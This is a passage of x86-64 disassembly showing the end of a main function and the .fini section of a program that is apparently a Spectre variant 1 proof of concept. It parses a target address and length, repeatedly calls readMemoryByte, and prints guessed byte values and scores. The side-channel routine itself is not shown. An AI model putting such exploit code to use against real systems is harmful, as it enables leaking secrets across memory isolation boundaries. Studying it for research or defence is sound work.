    16f3:	b8 00 00 00 00       	mov    $0x0,%eax
    16f8:	e8 d3 f9 ff ff       	call   10d0 <__isoc99_sscanf@plt>
    16fd:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1701:	48 8d 15 38 29 00 00 	lea    0x2938(%rip),%rdx        # 4040 <array1>
    1708:	48 29 d0             	sub    %rdx,%rax
    170b:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    170f:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    1713:	48 83 c0 10          	add    $0x10,%rax
    1717:	48 8b 00             	mov    (%rax),%rax
    171a:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
    171e:	48 8d 0d 56 09 00 00 	lea    0x956(%rip),%rcx        # 207b <_IO_stdin_used+0x7b>
    1725:	48 89 ce             	mov    %rcx,%rsi
    1728:	48 89 c7             	mov    %rax,%rdi
    172b:	b8 00 00 00 00       	mov    $0x0,%eax
    1730:	e8 9b f9 ff ff       	call   10d0 <__isoc99_sscanf@plt>
    1735:	8b 45 d4             	mov    -0x2c(%rbp),%eax
    1738:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
    173c:	48 89 d1             	mov    %rdx,%rcx
    173f:	89 c2                	mov    %eax,%edx
    1741:	48 89 ce             	mov    %rcx,%rsi
    1744:	48 8d 05 35 09 00 00 	lea    0x935(%rip),%rax        # 2080 <_IO_stdin_used+0x80>
    174b:	48 89 c7             	mov    %rax,%rdi
    174e:	b8 00 00 00 00       	mov    $0x0,%eax
    1753:	e8 68 f9 ff ff       	call   10c0 <printf@plt>
    1758:	8b 45 d4             	mov    -0x2c(%rbp),%eax
    175b:	89 c6                	mov    %eax,%esi
    175d:	48 8d 05 3f 09 00 00 	lea    0x93f(%rip),%rax        # 20a3 <_IO_stdin_used+0xa3>
    1764:	48 89 c7             	mov    %rax,%rdi
    1767:	b8 00 00 00 00       	mov    $0x0,%eax
    176c:	e8 4f f9 ff ff       	call   10c0 <printf@plt>
    1771:	e9 c0 00 00 00       	jmp    1836 <main+0x210>
    1776:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    177a:	48 89 c6             	mov    %rax,%rsi
    177d:	48 8d 05 3c 09 00 00 	lea    0x93c(%rip),%rax        # 20c0 <_IO_stdin_used+0xc0>
    1784:	48 89 c7             	mov    %rax,%rdi
    1787:	b8 00 00 00 00       	mov    $0x0,%eax
    178c:	e8 2f f9 ff ff       	call   10c0 <printf@plt>
    1791:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1795:	48 8d 50 01          	lea    0x1(%rax),%rdx
    1799:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
    179d:	48 8d 55 ec          	lea    -0x14(%rbp),%rdx
    17a1:	48 8d 4d f6          	lea    -0xa(%rbp),%rcx
    17a5:	48 89 ce             	mov    %rcx,%rsi
    17a8:	48 89 c7             	mov    %rax,%rdi
    17ab:	e8 69 fa ff ff       	call   1219 <readMemoryByte>
    17b0:	8b 55 ec             	mov    -0x14(%rbp),%edx
    17b3:	8b 45 f0             	mov    -0x10(%rbp),%eax
    17b6:	39 c2                	cmp    %eax,%edx
    17b8:	7c 09                	jl     17c3 <main+0x19d>
    17ba:	48 8d 05 2e 09 00 00 	lea    0x92e(%rip),%rax        # 20ef <_IO_stdin_used+0xef>
    17c1:	eb 07                	jmp    17ca <main+0x1a4>
    17c3:	48 8d 05 2c 09 00 00 	lea    0x92c(%rip),%rax        # 20f6 <_IO_stdin_used+0xf6>
    17ca:	48 89 c6             	mov    %rax,%rsi
    17cd:	48 8d 05 29 09 00 00 	lea    0x929(%rip),%rax        # 20fd <_IO_stdin_used+0xfd>
    17d4:	48 89 c7             	mov    %rax,%rdi
    17d7:	b8 00 00 00 00       	mov    $0x0,%eax
    17dc:	e8 df f8 ff ff       	call   10c0 <printf@plt>
    17e1:	8b 4d ec             	mov    -0x14(%rbp),%ecx
    17e4:	0f b6 45 f6          	movzbl -0xa(%rbp),%eax
    17e8:	0f b6 d0             	movzbl %al,%edx
    17eb:	0f b6 45 f6          	movzbl -0xa(%rbp),%eax
    17ef:	0f b6 c0             	movzbl %al,%eax
    17f2:	89 c6                	mov    %eax,%esi
    17f4:	48 8d 05 07 09 00 00 	lea    0x907(%rip),%rax        # 2102 <_IO_stdin_used+0x102>
    17fb:	48 89 c7             	mov    %rax,%rdi
    17fe:	b8 00 00 00 00       	mov    $0x0,%eax
    1803:	e8 b8 f8 ff ff       	call   10c0 <printf@plt>
    1808:	8b 45 f0             	mov    -0x10(%rbp),%eax
    180b:	85 c0                	test   %eax,%eax
    180d:	7e 27                	jle    1836 <main+0x210>
    180f:	8b 4d f0             	mov    -0x10(%rbp),%ecx
    1812:	0f b6 45 f7          	movzbl -0x9(%rbp),%eax
    1816:	0f b6 d0             	movzbl %al,%edx
    1819:	0f b6 45 f7          	movzbl -0x9(%rbp),%eax
    181d:	0f b6 c0             	movzbl %al,%eax
    1820:	89 c6                	mov    %eax,%esi
    1822:	48 8d 05 ef 08 00 00 	lea    0x8ef(%rip),%rax        # 2118 <_IO_stdin_used+0x118>
    1829:	48 89 c7             	mov    %rax,%rdi
    182c:	b8 00 00 00 00       	mov    $0x0,%eax
    1831:	e8 8a f8 ff ff       	call   10c0 <printf@plt>
    1836:	8b 45 d4             	mov    -0x2c(%rbp),%eax
    1839:	83 e8 01             	sub    $0x1,%eax
    183c:	89 45 d4             	mov    %eax,-0x2c(%rbp)
    183f:	8b 45 d4             	mov    -0x2c(%rbp),%eax
    1842:	85 c0                	test   %eax,%eax
    1844:	0f 89 2c ff ff ff    	jns    1776 <main+0x150>
    184a:	b8 00 00 00 00       	mov    $0x0,%eax
    184f:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    1853:	64 48 2b 14 25 28 00 	sub    %fs:0x28,%rdx
    185a:	00 00 
    185c:	74 05                	je     1863 <main+0x23d>
    185e:	e8 4d f8 ff ff       	call   10b0 <__stack_chk_fail@plt>
    1863:	c9                   	leave  
    1864:	c3                   	ret    

Disassembly of section .fini:

0000000000001868 <_fini>:
    1868:	f3 0f 1e fa          	endbr64 
    186c:	48 83 ec 08          	sub    $0x8,%rsp
    1870:	48 83 c4 08          	add    $0x8,%rsp
    1874:	c3                   	ret    
